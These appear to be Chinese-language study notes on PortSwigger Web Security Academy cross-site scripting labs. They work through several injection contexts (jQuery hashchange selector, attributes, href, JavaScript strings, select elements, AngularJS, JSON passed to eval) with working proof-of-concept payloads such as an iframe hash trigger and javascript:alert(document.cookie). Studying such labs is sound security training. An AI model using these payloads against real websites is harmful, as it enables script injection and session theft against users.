例子1:
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

<script>
      $(window).on('hashchange', function(){
                 var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                 if (post) post.get(0).scrollIntoView();
         });
 </script>
 通过DOM Invader无法找到，尝试用burp active scanner可以发现问题，那剩下的就是我们来分析一下它的上下文和如何触发的弹窗的问题了。
 首先我们看看什么时候才有可能进入这段代码，里面有个onhashchange event，也就是当url中带有hash，并且hash发生改变的时候才会触发。所以可以想到的一个方案就是用<iframe>
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 第一次加载iframe的时候会先去load 设置好的src值，注意这里有个#，然后用onload事件去改变这个src,想当于改变了hash的值，所以也就触发了onhashchange事件。但是为啥用<img src=x onerror=print()>
 就可以触发目前还没有想明白。
 如果我们根据active scan，它给出了以下的poc
 The following proof of concept was generated for this issue:
https://0a7100a804a6ae6681582f65008800bd.web-security-academy.net/#'"><img src=1 onerror=alert(1)>
所以要手动触发可以按下面两个步骤就可以触发了。
1.https://0a7100a804a6ae6681582f65008800bd.web-security-academy.net/#
2.https://0a7100a804a6ae6681582f65008800bd.web-security-academy.net/#'"><img src=1 onerror=alert(1)>

例子2:用户可控制的值在属性中
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
上下文是在属性中，所以逃逸引号就可以了
"onmouseover="alert(1)

例子3:用户可直接控制href的值
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
javascript:alert(document.cookie)

例子4:用户可控制的值inside a JavaScript string，比如这里是 var searchTerms = '用户可以控制的值'
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
                   <script>
                        var searchTerms = 'a13700';alert(1)//345';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
 
Solution中用的是的是这样的方案也是可以弹窗的.可以在https://www.w3schools.com/上试一下
<script>
var searchTerms = ''-alert(1)-'';
</script>

例子5:用户可控数据在tag中的，一般我们会直接用上<img%20src=1%20onerror=alert(1)>
但是因为数据被放置在select option里面,所以这里面可以考虑先闭合掉</select>即可触发漏洞了。
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

例子6:在AngularJS中(未来可以考虑如何做到插件里面作为一个passive scan点)
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
这里的关键是如何自动识别到AngularJS，主要就是看HTML nodes containing the ng-app attribute,比如<body ng-app>
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md

例子7:可控数据在json中
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
 eval('var searchResultsObj = ' + this.responseText);
通过DOM Invader是可以找到前面这个sink点的，而且给出了var searchResultsObj = {"results":[],"searchTerm":"aydkrl4k1'\"<>"}
我们可以发现可控数据是在json数据中，所以这个时候想到的就是要逃逸"，然后注入类似:"-alert(1)}//的数据.

